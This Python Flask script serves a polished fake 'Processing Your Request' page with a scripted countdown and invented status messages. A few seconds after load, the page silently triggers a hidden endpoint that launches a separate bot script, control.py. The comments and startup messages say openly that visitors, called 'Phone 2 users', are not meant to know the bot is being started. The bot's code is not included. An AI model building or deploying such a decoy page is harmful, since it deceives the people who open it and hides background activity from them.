#!/usr/bin/env python3
"""
Beautiful Frontend + Backend Connection
Phone 2 users see a beautiful page while secretly connecting to Phone 1's bot
"""

from flask import Flask, render_template_string, jsonify
import subprocess
import os
import sys
import time
import threading
from pathlib import Path

app = Flask(__name__)

# Global variables
bot_process = None
bot_running = False

def find_control_py():
    """Find the control.py script in the current directory"""
    current_dir = Path.cwd()
    control_script = current_dir / "control.py"
    
    if control_script.exists():
        return str(control_script)
    return None

def start_bot_background():
    """Start the bot in the background without user knowing"""
    global bot_process, bot_running
    
    if bot_running:
        return True, "Bot already running"
    
    control_script = find_control_py()
    if not control_script:
        return False, "Control script not found"
    
    try:
        # Start the bot silently in background
        bot_process = subprocess.Popen(
            [sys.executable, control_script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        
        # Wait to see if it starts
        time.sleep(3)
        
        if bot_process.poll() is None:
            bot_running = True
            return True, "Bot started successfully"
        else:
            return False, "Failed to start bot"
            
    except Exception as e:
        return False, f"Error: {str(e)}"

@app.route('/')
def index():
    """Beautiful frontend page"""
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Processing Your Request</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                padding: 20px;
                overflow: hidden;
            }
            
            .container {
                background: rgba(255, 255, 255, 0.1);
                padding: 50px;
                border-radius: 25px;
                backdrop-filter: blur(20px);
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
                text-align: center;
                max-width: 600px;
                width: 100%;
                position: relative;
                overflow: hidden;
            }
            
            .container::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
                animation: shimmer 3s infinite;
                pointer-events: none;
            }
            
            @keyframes shimmer {
                0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
                100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
            }
            
            .icon {
                font-size: 80px;
                margin: 20px 0;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.1); }
            }
            
            h1 {
                font-size: 2.8rem;
                margin-bottom: 20px;
                font-weight: 700;
                background: linear-gradient(45deg, #fff, #f0f0f0);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
            }
            
            .message {
                font-size: 1.3rem;
                margin-bottom: 30px;
                opacity: 0.9;
                line-height: 1.6;
                font-weight: 500;
            }
            
            .processing-bar {
                width: 100%;
                height: 8px;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 4px;
                overflow: hidden;
                margin: 30px 0;
                position: relative;
            }
            
            .progress {
                height: 100%;
                background: linear-gradient(90deg, #4CAF50, #45a049);
                border-radius: 4px;
                width: 0%;
                animation: progress 120s linear forwards;
                position: relative;
            }
            
            @keyframes progress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .progress::after {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
                animation: shimmer-progress 2s infinite;
            }
            
            @keyframes shimmer-progress {
                0% { transform: translateX(-100%); }
                100% { transform: translateX(100%); }
            }
            
            .status {
                background: rgba(255, 255, 255, 0.15);
                padding: 20px;
                border-radius: 15px;
                margin: 20px 0;
                font-size: 16px;
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            
            .dots {
                display: inline-block;
                animation: dots 1.5s infinite;
            }
            
            @keyframes dots {
                0%, 20% { content: '.'; }
                40% { content: '..'; }
                60%, 100% { content: '...'; }
            }
            
            .floating-elements {
                position: absolute;
                width: 100%;
                height: 100%;
                pointer-events: none;
                overflow: hidden;
            }
            
            .floating-element {
                position: absolute;
                width: 20px;
                height: 20px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 50%;
                animation: float 6s infinite linear;
            }
            
            .floating-element:nth-child(1) {
                top: 10%;
                left: 10%;
                animation-delay: 0s;
            }
            
            .floating-element:nth-child(2) {
                top: 20%;
                right: 15%;
                animation-delay: 2s;
            }
            
            .floating-element:nth-child(3) {
                bottom: 30%;
                left: 20%;
                animation-delay: 4s;
            }
            
            @keyframes float {
                0% { transform: translateY(0px) rotate(0deg); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
            }
            
            .countdown {
                font-size: 1.1rem;
                margin-top: 20px;
                opacity: 0.8;
                font-weight: 500;
            }
            
            .success-message {
                display: none;
                background: rgba(76, 175, 80, 0.2);
                border: 1px solid rgba(76, 175, 80, 0.4);
                padding: 20px;
                border-radius: 15px;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <div class="floating-elements">
            <div class="floating-element"></div>
            <div class="floating-element"></div>
            <div class="floating-element"></div>
        </div>
        
        <div class="container">
            <div class="icon">⏳</div>
            <h1>Processing Your Request</h1>
            <div class="message">
                Please wait for 2 minutes while we are processing<span class="dots">...</span>
            </div>
            
            <div class="processing-bar">
                <div class="progress"></div>
            </div>
            
            <div class="status" id="status">
                Initializing system<span class="dots">...</span>
            </div>
            
            <div class="countdown" id="countdown">
                Time remaining: 2:00
            </div>
            
            <div class="success-message" id="successMessage">
                ✅ Processing completed successfully!
            </div>
        </div>

        <script>
            let timeLeft = 120; // 2 minutes in seconds
            let currentStep = 0;
            
            const statusMessages = [
                "Initializing system...",
                "Connecting to servers...",
                "Loading resources...",
                "Preparing data...",
                "Almost done...",
                "Finalizing..."
            ];
            
            function updateCountdown() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                document.getElementById('countdown').textContent = 
                    `Time remaining: ${minutes}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 0) {
                    document.getElementById('countdown').textContent = "Processing completed!";
                    document.getElementById('successMessage').style.display = 'block';
                    document.getElementById('status').innerHTML = '✅ All done!';
                } else {
                    timeLeft--;
                    setTimeout(updateCountdown, 1000);
                }
            }
            
            function updateStatus() {
                if (currentStep < statusMessages.length) {
                    document.getElementById('status').innerHTML = statusMessages[currentStep] + '<span class="dots">...</span>';
                    currentStep++;
                    setTimeout(updateStatus, 20000); // Update every 20 seconds
                }
            }
            
            // Start countdown and status updates
            updateCountdown();
            updateStatus();
            
            // Start the bot in background after a short delay
            setTimeout(async () => {
                try {
                    const response = await fetch('/start_bot', { method: 'POST' });
                    const data = await response.json();
                    console.log('Bot status:', data);
                } catch (error) {
                    console.log('Background process started');
                }
            }, 3000);
        </script>
    </body>
    </html>
    ''')

@app.route('/start_bot', methods=['POST'])
def start_bot():
    """Start the bot in background (Phone 2 user doesn't know this)"""
    success, message = start_bot_background()
    return jsonify({
        'success': success,
        'message': message,
        'running': bot_running
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'bot_running': bot_running
    })

if __name__ == '__main__':
    print("🎭 Beautiful Frontend + Secret Backend")
    print("=" * 50)
    
    # Check if control.py exists
    control_script = find_control_py()
    if control_script:
        print(f"✅ Found control.py: {control_script}")
    else:
        print("❌ Could not find control.py script")
        print("   Make sure control.py is in the same directory")
        sys.exit(1)
    
    print("\n🌐 Beautiful frontend available at:")
    print("   Local: http://localhost:5000")
    print("   Network: http://[your-ip]:5000")
    print("\n📱 Phone 2 users will see a beautiful page")
    print("🤫 While secretly connecting to your bot!")
    print("\n" + "=" * 50)
    
    try:
        app.run(host='0.0.0.0', port=5000, debug=False)
    except KeyboardInterrupt:
        print("\n🛑 App stopped")
    except Exception as e:
        print(f"\n❌ Error: {e}")
